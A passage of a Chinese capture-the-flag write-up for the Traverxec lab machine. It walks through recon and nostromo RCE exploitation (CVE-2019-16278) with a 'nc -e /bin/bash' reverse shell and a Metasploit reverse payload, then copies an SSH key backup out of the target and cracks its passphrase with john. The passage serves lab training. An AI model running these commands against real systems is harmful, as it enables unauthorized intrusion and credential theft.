Nmap done: 1 IP address (1 host up) scanned in 461.24 seconds

&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;nmap -A (进攻性扫描模式选项)&lt;/p&gt;

  &lt;p&gt;这个选项启用额外的高级和高强度选项，目前还未完全确定具体的内容。目前，这个选项集成了操作系统检测(-O) 和版本扫描(-sV)，以后会增加更多的功能。 目的是启用一个全面的扫描选项集合，而不需要用户记忆大量的选项。这个选项仅仅启用功能，不包含用于可能所需要的 时间选项(如-T4)或细节选项(-v)。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;目标靶机开放了 22 和 80 端口，注意到其中 80 端口使用了 &lt;strong&gt;nostromo 1.9.6&lt;/strong&gt; 服务&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;访问 web 服务查看是否存在有用信息&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gailmzeunpj31qk0u04ju.jpg&quot; alt=&quot;image-20200102224439846&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@kali:~# dirsearch -u &quot;10.10.10.165&quot; -e *

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions:  | Threads: 10 | Wordlist size: 6083

Error Log: /root/dirsearch/logs/errors-20-01-02_22-46-54.log

Target: 10.10.10.165

[22:46:58] Starting: 
[22:47:04] 400 -  302B  - /%2e%2e/google.com
[22:47:04] 501 -  310B  - /%20../
[22:47:10] 200 -   15KB - /
[22:48:05] 200 -   15KB - /%3f/
[22:52:37] 501 -  310B  - /admin%20/
[22:56:49] 301 -  314B  - /css  -&amp;gt;  http://10.10.10.165/css/
[22:58:48] 301 -  314B  - /icons  -&amp;gt;  http://10.10.10.165/icons/
[22:58:58] 301 -  314B  - /img  -&amp;gt;  http://10.10.10.165/img/
[22:59:11] 200 -   15KB - /index.html
[22:59:30] 301 -  314B  - /js  -&amp;gt;  http://10.10.10.165/js/
[22:59:44] 301 -  314B  - /lib  -&amp;gt;  http://10.10.10.165/lib/
[23:01:26] 501 -  310B  - /New%20Folder
[23:01:26] 501 -  310B  - /New%20folder%20%282%29
[23:03:34] 200 -  203B  - /Readme.txt

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;查看源码、扫描目录后均未发现特别有意义的信息，倒是知道了网站的所有者叫 David&lt;/p&gt;

&lt;h2 id=&quot;0x02-getshell&quot;&gt;0x02 Getshell&lt;/h2&gt;

&lt;p&gt;nostromo nhttpd 存在版本漏洞，可以远程执行命令，这里可以有两种办法 getshell&lt;/p&gt;

&lt;h3 id=&quot;方法一手工利用&quot;&gt;方法一：手工利用&lt;/h3&gt;

&lt;p&gt;下载公开 exploits，&lt;a href=&quot;https://github.com/jas502n/CVE-2019-16278&quot;&gt;CVE-2019-16278&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;利用方式：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./CVE-2019-16278.sh 'ip' 'port' 'cmd'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在本机监听 4444 端口，利用 exp 反弹 bash 回 kali 攻击机，获得靶机 shell&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;root@kali:~/CVE/CVE-2019-16278# ./CVE-2019-16278.sh 10.10.10.165 80 nc -e /bin/bash 10.10.15.44 4444

root@kali:~/CVE/CVE-2019-16278# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.44] from (UNKNOWN) [10.10.10.165] 54462
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;此时获取的并不是一个具有完整功能的 bash，为了获取一个交互式的 tty 我们可以利用以下命令（第一个成功率最高）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;1. python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
2. echo os.system('/bin/bash')
3. /bin/sh -i
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Tips:&lt;/strong&gt; 之后为了得到一个更好的用的 shell 可以按 &lt;strong&gt;Ctrl + z&lt;/strong&gt; 挂起任务，之后输入 &lt;strong&gt;stty raw -echo&lt;/strong&gt; .  然后输入 &lt;strong&gt;fg&lt;/strong&gt; 将任务回到前台，这样我们就可以在 shell 中使用上下键回到上一条命令并利用 tab 补全命令。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)';
www-data@traverxec:/usr/bin$ ^Z
[1]+  已停止               nc -lvnp 4444
root@kali:~/CVE/CVE-2019-16278# stty raw -echo 
root@kali:~/CVE/CVE-2019-16278# nc -lvnp 4444
                                             pwd
/usr/bin
www-data@traverxec:/usr/bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;反弹 shell 的一些技术文章&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2548&quot;&gt;Linux反弹shell（一）文件描述符与重定向&lt;/a&gt;&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2549#toc-5&quot;&gt;Linux 反弹shell（二）反弹shell的本质&lt;/a&gt;&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/87017&quot;&gt;linux各种一句话反弹shell总结&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;方法二msf-自动化利用&quot;&gt;方法二：msf 自动化利用&lt;/h3&gt;

&lt;p&gt;更新 msf&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ apt update
$ apt install metasploit-framework
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;搜索漏洞并利用：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;root@kali:~# msfconsole
[-] ***rting the Metasploit Framework console.../
[-] * WARNING: No database support: could not connect to server: Connection refused
	Is the server running on host &quot;localhost&quot; (::1) and accepting
	TCP/IP connections on port 5432?
could not connect to server: Connection refused
	Is the server running on host &quot;localhost&quot; (127.0.0.1) and accepting
	TCP/IP connections on port 5432?

[-] ***
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v5.0.66-dev                          ]
+ -- --=[ 1956 exploits - 1092 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 &amp;gt; search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   -  ----                                   ---------------  ----  -----  -----------
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution


msf5 &amp;gt; use exploit/multi/http/nostromo_code_exec 
msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; show options 

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)


msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; set LHOST 10.10.15.44
LHOST =&amp;gt; 10.10.15.44
msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; set RHOST 10.10.10.165
RHOST =&amp;gt; 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; exploit 

[*] Started reverse TCP handler on 10.10.15.44:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.15.44:4444 -&amp;gt; 10.10.10.165:57788) at 2020-01-02 23:28:33 +0800
id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
shell
[*] Trying to find binary(python) on target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
$ pwd
pwd
/usr/bin
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;0x03-usertxt&quot;&gt;0x03 User.txt&lt;/h2&gt;

&lt;p&gt;我们以 www-data 的低权限进入了靶机&lt;/p&gt;

&lt;p&gt;在 /home 目录下发现疑似 user 的文件夹，但没有权限读取其目录&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;www-data@traverxec:/usr/bin$ cd /home
www-data@traverxec:/home$ ls
david
www-data@traverxec:/home$ cd david
www-data@traverxec:/home/david$ ls
ls: cannot open directory '.': Permission denied
www-data@traverxec:/home/david$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这时候可以去找配置文件和证书文件等，我们在 &lt;strong&gt;/var/nostromo/conf&lt;/strong&gt; 目录下发现了 nostromo 的配置文件&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;www-data@traverxec:/home/david$ cd /var/nostromo/conf/
www-data@traverxec:/var/nostromo/conf$ ls
mimes  nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;发现在 /home 目录下存在 public_www 的文件夹，但之前查看 /home 的目录时没有找到，猜想 public_www 存在 david 文件下，尝试 cd 进去&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;www-data@traverxec:/var/nostromo/conf$ cd /home/david/public_www
www-data@traverxec:/home/david/public_www$ ls
index.html  protected-file-area
www-data@traverxec:/home/david/public_www$ cd protected-file-area/
www-data@traverxec:/home/david/public_www/protected-file-area$ ls backup-ssh-identity-files.tgz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其中有 ssh 密钥的备份文件压缩包 backup-ssh-identity-files.tgz, 可以通过 base64 将其拷贝到本地 kali&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ base64 backup-ssh-identity-files.tgz                       
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
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后用 &lt;code&gt;base64 -d&lt;/code&gt; 在本地还原 .tgz&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;root@kali:~# echo &quot;H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O+Y8AYAzcROwabff/1425pNJpWMtFInWRm4uem
&amp;gt; gKJ0UL311jlF2T4zMI2Wewr+OI4l+Ol3AHpBQtCXFibxf2n/wScYxXGMIGCURD5BMELCyKcP/Pf4
&amp;gt; mG+ZxykaPj4+fZ2Df/Peb/X/j1J+o380T2U73I8s/bnO9vG7xPgiMIFhv6o/AePf6E9AxEt/6LtE
&amp;gt; /w3+4vq/NP88jNEH84JFzSPi4D1BhC+3PGMz7JfHjM2N/jAadgJdSVjy/NeVew4UGQkXbu02dzPh
&amp;gt; 6hzE7jwt5h64paBUQcd5I85rZXhHBnNuFCo8CTsocnTcPbm7OkUttG1KrEJIcpKJHkYjRhzchYAl
&amp;gt; 5rjjTeZjeoUIYKeUKaqyYuAo9kqTHEEYZ/Tq9ZuWNNLALUFTqotmrGRzcRQw8V1LZoRmvUIn84Yc
&amp;gt; rKakVOI4+iaJu4HRXcWH1sh4hfTIU5ZHKWjxIjo1BhV0YXTh3TCUWr5IerpwJh5mCVNtdTlybjJ2
&amp;gt; r53ZXvRbVaPNjecjp1oJY3s6k15TJWQY5Em5s0HyGrHE9tFJuIG3BiQuZbTa2WSSsJaEWHX1NhN9
&amp;gt; noI66mX+4+ua+ts0REs2bFkC/An6f+v/e/rzazl83xhfPf7r+z+KYsQ//Y/iL/9jMIS//f9H8PkL
&amp;gt; rCAp5odzYT4sR/EYV/jQhOBrD2ANbfLZ3bvspw/sB8HknMByBR7gBe2z0uTtTx+McPkMI9RnjuV+
&amp;gt; wEhSEESRZXBCpHmEQnkUo1/68jgPURwmAsCY7ZkM5pkE0+7jGhnpIocaiPT5TnXrmg70WJD4hpVW
&amp;gt; p6pUEM3lrR04E9Mt1TutOScB03xnrTzcT6FVP/T63GRKUbTDrNeedMNqjMDhbs3qsKlGl1IMA62a
&amp;gt; VDcvTl1tnOujN0A7brQnWnN1scNGNmi1bAmVOlO6ezxOIyFVViduVYswA9JYa9XmqZ1VFpudydpf
&amp;gt; efEKOOq1S0Zm6mQm9iNVoXVx9ymltKl8cM9nfWaN53wR1vKgNa9akfqus/quXU7j1aVBjwRk2ZNv
&amp;gt; GBmAgicWg+BrM3S2qEGcgqtun8iabPKYzGWl0FSQsIMwI+gBYnzhPC0YdigJEMBnQxp2u8M575gS
&amp;gt; Ttb3C0hLo8NCKeROjz5AdL8+wc0cWPsequXeFAIZW3Q1dqfytc+krtN7vdtY5KFQ0q653kkzCwZ6
&amp;gt; ktebbV5OatEvF5sO+CpUVvHBUNWmWrQ8zreb70KhCRDdMwgTcDBrTnggD7BV40hl0coCYel2tGCP
&amp;gt; qz5DVNU+pPQW8iYe+4iAFEeacFaK92dgW48mIqoRqY2U2xTH9IShWS4Sq7AXaATPjd/JjepWxlD3
&amp;gt; xWDduExncmgTLLeop/4OAzaiGGpf3mi9vo4YNZ4OEsmY8kE1kZAXzSmP7SduGCG4ESw3bxfzxoh9
&amp;gt; M1eYw+hV2hDAHSGLbHTqbWsuRojzT9s3hkFh51lXiUIuqmGOuC4tcXkWZCG/vkbHahurDGpmC465
&amp;gt; QH5kzORQg6fKD25u8eo5E+V96qWx2mVRBcuLGEzxGeeeoQOVxu0BH56NcrFZVtlrVhkgPorLcaip
&amp;gt; FsQST097rqEH6iS1VxYeXwiG6LC43HOnXeZ3Jz5d8TpC9eRRuPBwPiFjC8z8ncj9fWFY/5RhAvZY
&amp;gt; 1bBlJ7kGzd54JbMspqfUPNde7KZigtS36aApT6T31qSQmVIApga1c9ORj0NuHIhMl5QnYOeQ6ydK
&amp;gt; DosbDNdsi2QVw6lUdlFiyK9blGcUvBAPwjGoEaA5dhC6k64xDKIOGm4hEDv04mzlN38RJ+esB1kn
&amp;gt; 0ZlsipmJzcY4uyCOP+K8wS8YDF6BQVqhaQuUxntmugM56hklYxQso4sy7ElUU3p4iBfras5rLybx
&amp;gt; 5lC2Kva9vpWRcUxzBGDPcz8wmSRaFsVfigB1uUfrGJB8B41Dtq5KMm2yhzhxcAYJl5fz4xQiRDP5
&amp;gt; 1jEzhXMFQEo6ihUnhNc0R25hTn0Qpf4wByp8N/mdGQRmPmmLF5bBI6jKiy7mLbI76XmW2CfN+IBq
&amp;gt; mVm0rRDvU9dVihl7v0I1RmcWK2ZCYZe0KSRBVnCt/JijvovyLdiQBDe6AG6cgjoBPnvEukh3ibGF
&amp;gt; d+Y2jFh8u/ZMm/q5cCXEcCHTMZrciH6sMoRFFYj3mxCr8zoz8w3XS6A8O0y4xPKsbNzRZH3vVBds
&amp;gt; Mp0nVIv0rOC3OtfgTH8VToU/eXl+JhaeR5+Ja+pwZ885cLEgqV9sOL2z980ytld9cr8/naK4ronU
&amp;gt; pOjDYVkbMcz1NuG0M9zREGPuUJfHsEa6y9kAKjiysZfjPJ+a2baPreUGga1d1TG35A7mL4R9SuII
&amp;gt; FBvJDLdSdqgqkSnIi8wLRtDTBHhZ0NzFK+hKjaPxgW7LyAY1d3hic2jVzrrgBBD3sknSz4fT3irm
&amp;gt; 6Zqg5SFeLGgaD67A12wlmPwvZ7E/O8v+9/LL9d+P3Rx/vxj/0fmPwL7Uf19+F7zrvz+A9/nvr33+
&amp;gt; e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==&quot; | base64 -d &amp;gt; sshbackup.tgz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;解压 sshbackup.tgz，发现 david 的 ssh 密钥&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;root@kali:~# tar -zxvf sshbackup.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用 ssh2john 对 passphrase 进行爆破&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;root@kali:~/home/david/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
root@kali:~/home/david/.ssh# ssh2john id_rsa &amp;gt; davidhash
root@kali:~/home/david/.ssh# ls
authorized_keys  davidhash  id_rsa  id_rsa.pub
root@kali:~/home/david/.ssh# cat davidhash 
id_rsa:$ssh2$2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d0a50726f632d547970653a20342c454e435259505445440a44454b2d496e666f3a204145532d3132382d4342432c34373745454646424135364639443238334433343930333344354430384334460a0a73657965482f6665473139546c55614d6476485a4b2f32716679387077776472397367373578346850704a4a3859617568576f72434e344c504a562b776643470a7475694250665a792b5a506b6c4c6b4f6e654967676f72754c6b564757346b343635317077656b5a6e6a735438494d4d336a6e644c4e53526b6a7843545833570a4b7a5739564650756a53515a6e484d394a686f364a384f384c547a6c2b7336476a507046786a6f324172326e50776a6f666451656a5042654f376b58774446550a524a5570637341747048416258614a49394c46795838496851386672544f4f4c75424d6d75534577687a394b566a77326b694c424c794b532b735554392f56370a48485648573437592f455646677245584b75304f503872467459554c512b376b376e666237664849674b4a2f3651595a65363972304158454f747634347a49630a59314f4d47727951703543567a746343484c79532f394773524230643054746c7159324c586b2b316e75595079795a4a68796e6745376250396a73702b6865630a645452715671546e50377a493847794b54562b4b4e6741306d375557514e532b4a67717653513959446a5a4977466c41386a784a503948737557575854305a4e0a36706d595a632f724e6b43456c326c2f6f4a62614a42336a502f3147577a6f2f71354a5841366a6a79726439785a444e356258324532677a646343506435714f0a78777a6e61366a73326b4d64437849524e5645726e7653474249425330732f4f6e5870486e4a546a4d726b716772505743654c41663078455054676b747169310a5132494d4a716857394c6b55733438732b7a37326541686c386e614566676e2b6662516d354d4d5a2f783642437578534e574146716e756a3452414c6a646e360a693237676573526b78786e534d5a35446d51584d7272494275754c4a366748676a72756143706468354875454845665546716e624a6f624a41334e65763534540a667a654174523872564a486c43756f356a6d75366869747147736a7948464a2f6853465974624f35436d5a5230684d576c317a56513343624e686a65497746410a627a67537a7a4a644b59624744397479664b337a3352636b566867564467454d465242354871432b7948447952622b55356b61334c636c675431724f2b32736f0a75446936665879764142582b653445346c774a5a6f4274486b2f4e714d76445465623974644e4f6b566254644663326b57747a3938564639796f4e38327538490a416b2f4b4f6e70376c7a486e523037647664443631527a486b6d3337727654597255657861484a343538644854333672665578616665383176366c36524d38730a3943427245702b4c4b4141324a724b35503230427271467550665758764674524f4c596570473965484e46654e34754d7375542f35356c62666e355334312f550a72477730747859496e566d654c5230524a4f333762332f68615349727963616b384c5a7a465350554e757771466362785238514a4671714c7868614d7a7475610a346d4f717241654746505038445367593354436c6f524d3048692f4d7a485055496374784856325262594f2f36544448667a2b5a32366e7458507a75416752550a2f38477a67773536457948446154674e7471596164587275594a31694e447941724541752b4b76565a68596c596a68534c46666f327952644f7547426d3941580a4a504e65617877304458385577476241517955306b3439655042466545675168394e4563596567436f486c7561717061667859783263354d7059316e5267382b0a58427a624c463970634d785a69415772733462575571416f645866455536465a7637647361745461396c77483034616a2f35717845624a757775417557354c680a684f52415a766248754978437a6e657171526a5334744e526d306b4639754935576b664b31654c4d4f336758745666664f36764444336d63544e4c31705175660a53503047717651316469426978504d782b596b69696d526767557763476e64336c52424251324d4e7757743539527269335a34416930706662314b3754764f4d0a6a3161513462516d56583875426f7162507657302f6f516a6b624376665234587636512b6362612f466e474e5a78684852386a6348383056614e5334363974740a5665596e6946552f54476e524b44594c51483278306e693174426630774b4f4c45525930436247446371757a526f576a416d544e2f5056325662454b4b442f770a2d2d2d2d2d454e44205253412050524956415445204b45592d2d2d2d2d0a*1766*0
root@kali:~/home/david/.ssh# john --wordlist=/usr/share/wordlists/rockyou.txt davidhash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;获得 ssh 登录密码 &lt;code&gt;hunter&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;使用 ssh 登录获得 user 权限，读取 user.txt&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;root@kali:~# ssh -i ./home/david/.ssh/id_rsa david@traverxec.htb
ssh: Could not resolve hostname traverxec.htb: Name or service not known
root@kali:~# ssh -i ./home/david/.ssh/id_rsa david@10.10.10.165
Enter passphrase for key './home/david/.ssh/id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Thu Jan  2 10:55:21 2020 from 10.10.14.47
david@traverxec:~$ ls
bin  public_www  user.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;0x04-roottxt&quot;&gt;0x04 root.txt&lt;/h2&gt;

&lt;p&gt;当进行提权时，注意到的第一件事是 david 的主目录中有一个 bin 目录，该目录中有一个名为 server-stats.sh 的文件。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;david@traverxec:/bin$ cd
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh  try.sh
david@traverxec:~/bin$ ./server-stats.sh 
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-&quot;&quot;&quot;&quot;&quot;-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '&quot;&quot;)---(&quot;&quot;' |___.|
                                                             /:::::::::::\&quot;    &quot;
                                                            /:::=======:::\
                                                        jgs '&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;' 

Load:  11:15:23 up  1:00,  3 users,  load average: 0.11, 0.04, 0.01
 
Open nhttpd sockets: 18
Files in the docroot: 117
 
Last 5 journal log lines:
-- Logs begin at Thu 2020-01-02 10:14:54 EST, end at Thu 2020-01-02 11:15:23 EST. --
Jan 02 11:14:48 traverxec sudo[2762]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/12 ruser=www-data rhost=  user=www-data
Jan 02 11:14:50 traverxec sudo[2762]: pam_unix(sudo:auth): conversation failed
Jan 02 11:14:50 traverxec sudo[2762]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Jan 02 11:14:50 traverxec sudo[2762]: www-data : command not allowed ; TTY=pts/12 ; PWD=/dev/shm ; USER=root ; COMMAND=list
Jan 02 11:14:51 traverxec crontab[2855]: (www-data) LIST (www-data)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;journalctl 是一个收集服务日志的服务&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash
cat /home/david/bin/server-stats.head
echo &quot;Load: `/usr/bin/uptime`&quot;
echo &quot; &quot;
